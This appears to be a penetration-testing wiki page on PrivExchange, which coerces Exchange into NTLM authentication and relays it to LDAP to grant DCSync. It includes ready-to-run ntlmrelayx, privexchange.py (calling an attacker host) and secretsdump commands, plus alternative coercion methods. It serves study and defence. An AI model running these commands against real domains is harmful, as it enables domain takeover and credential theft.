---
title: "PrivExchange: coercing Exchange and relaying it to Active Directory"
order: 4
description: "Coercing the Exchange machine account to authenticate to an attacker host over EWS push notifications, then relaying that privileged NTLM to LDAP on a domain controller to grant DCSync, because Exchange historically holds WriteDacl over the domain object. Includes the PushSubscription primitive, PetitPotam and PrinterBug alternatives, and the follow-on to Domain Admin."
keywords:
  - PrivExchange
  - EWS push notification
  - NTLM relay
  - WriteDacl
  - DCSync
---

# PrivExchange

Exchange authenticates **as its own machine account** when it calls back to a client, and in an unhardened deployment the Exchange servers (through the `Exchange Windows Permissions` group) hold **`WriteDacl` over the domain object**. PrivExchange welds those two facts together: make Exchange authenticate to you, [relay](../../directory/active-directory/authentication/ntlm/relay.md) that authentication to a domain controller's **LDAP**, and spend Exchange's write access to add a **DCSync** ACE for a principal you control. One low-privileged mailbox credential becomes Domain Admin.

## The coercion primitive

The EWS **`SubscribeToPushNotification`** operation asks Exchange to send event notifications to a callback URL you choose. Exchange dutifully connects to that URL and, when challenged, authenticates over NTLM with the **Exchange server's machine account** (`EXCH$`), which is a member of `Exchange Windows Permissions`. The subscription request needs only a valid mailbox credential to be accepted. The attacker host collects that machine-account authentication and relays it onward before the handshake completes.

## The relay chain

Stand up the relay first so the coerced authentication has somewhere to land, then fire the coercion:

```bash
# 1. Relay listener: forward incoming NTLM to the DC's LDAP and escalate the named user to DCSync
ntlmrelayx.py -t ldap://dc01.example.local --escalate-user attacker

# 2. Coerce Exchange: push-subscribe it to authenticate back to the attacker host
privexchange.py -ah 10.10.14.7 mail.example.com -u john.doe -p 'Password1' -d example.local
```

What you should see: `privexchange.py` reports the subscription was accepted, then within seconds `ntlmrelayx` logs an inbound connection from `EXAMPLE\EXCH$`, authenticates it to LDAP, and prints that it added the DCSync rights (replication ACEs) to `attacker` on the domain object. If instead you see the relay authenticate but fail to modify the DACL, the account relayed does not actually hold `WriteDacl` on that build, read the follow-on below.

Then collect the hashes the new rights let you pull:

```bash
# Use the granted DCSync rights to replicate the krbtgt and admin hashes
secretsdump.py -just-dc 'example.local/attacker:Password1@dc01.example.local'
```

The `krbtgt` hash in that output is a golden-ticket key; the Administrator hash is immediate domain control. That is the follow-on: DCSync to Domain Admin.

## Variants and alternative coercion

- **Relay direction.** Classic PrivExchange relays **from** Exchange to LDAP. Later NTLM-relay issues also relay **to** an Exchange front end (for example to write mailbox permissions or reach the PowerShell back end), so treat the Exchange machine account as both a relay source and a relay target.
- **`PetitPotam`** coerces the authentication of a target host's machine account through the EFSRPC interface (`lsarpc`/`efsrpc`), and the **PrinterBug** (`MS-RPRN` `RpcRemoteFindFirstPrinterChangeNotification`) coerces it through the print spooler. Pointed at the Exchange server, either produces the same `EXCH$` authentication that PrivExchange gets from EWS, without needing a mailbox credential. See [coercion](../../directory/active-directory/authentication/ntlm/coercion.md).
- **Relay target choice.** When relaying to LDAP, signing requirements decide feasibility: if LDAP signing is enforced, relay to **LDAPS** or pivot the target to an [ADCS](../../directory/active-directory/authentication/credentials/ntds-and-dcsync.md) web enrollment endpoint or an RBCD/shadow-credential write instead.

## When the direct DCSync grant is blocked

Microsoft's split-permissions model and Extended Protection for Authentication (EPA) cut the two legs of the chain, so the escalation is conditional on configuration:

- Confirm `Exchange Windows Permissions` (and the Exchange servers group) still hold `WriteDacl`/`WriteOwner` on the domain object during [ACL enumeration](../../directory/active-directory/dacl/acl-enumeration.md) before you rely on the DCSync grant.
- Where the domain-object write is gone, relay the coerced Exchange authentication to a **different privileged write** instead: configure resource-based constrained delegation on a computer you can control, or add [shadow credentials](../../directory/active-directory/authentication/kerberos/shadow-credentials.md) (`msDS-KeyCredentialLink`) to a target, then escalate through [ownership and ACL rewrite](../../directory/active-directory/dacl/ownership-and-acl-rewrite.md).

## Exploitation notes

- It needs only a **single mailbox credential** for the EWS path, so it pairs directly with a [spraying](password-spraying.md) hit and reaches DA without any code execution on the server.
- EPA on the Exchange endpoints and LDAP channel binding on the DC are the usual blockers; if the relay authenticates but the LDAP bind is rejected, channel binding is on and you need an EPA bypass or a different relay target.
- The coercion is authenticated EWS traffic and leaves Exchange running normally, so it is far quieter than firing an RCE chain against the same box.

## Tools

- **PrivExchange** (dirkjanm): the EWS push-subscription coercion.
- **Impacket** (`ntlmrelayx.py --escalate-user`, `secretsdump.py`): relay to LDAP, grant DCSync, replicate hashes.
- **Coercer / PetitPotam / PrinterBug**: credential-free coercion of the Exchange host's machine account.

## References

- [PrivExchange (dirkjanm)](https://github.com/dirkjanm/PrivExchange)
- [dirkjanm: Abusing Exchange, one API call away from Domain Admin](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
- [The Hacker Recipes: NTLM relay](https://www.thehacker.recipes/ad/movement/ntlm/relay)
- [Impacket ntlmrelayx](https://github.com/fortra/impacket)
